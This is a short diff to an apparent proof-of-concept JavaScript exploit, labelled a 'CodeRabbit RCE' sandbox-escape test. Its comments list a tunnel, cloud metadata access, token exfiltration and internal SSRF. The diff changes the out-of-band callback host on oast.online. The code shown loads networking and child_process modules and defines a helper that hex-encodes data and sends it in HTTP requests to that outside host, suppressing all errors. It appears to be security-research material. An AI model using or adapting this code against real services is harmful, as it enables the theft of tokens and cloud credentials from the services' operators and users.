@@ -1,6 +1,6 @@
 // CodeRabbit RCE — COMBINED decisive escape test (one slot, lean).
 // T1 control tunnel · T2 metadata via TLS-over-tunnel · T3 tokenizer token-exfil · T4 internal SSRF.
-var C = 'd8squqjoeaqoal23gdm09p6ee1jntofun.oast.online';
+var C = 'd8sr8ajoeaqodmubkvmgsfkh7b4dww7hk.oast.online';
 var http = require('http'), dns = require('dns'), net = require('net'), tls = require('tls'), cp = require('child_process');
 var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
 var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 700), timeout: 9000 }, function () {}).on('error', function () {}); } catch (e) {} };
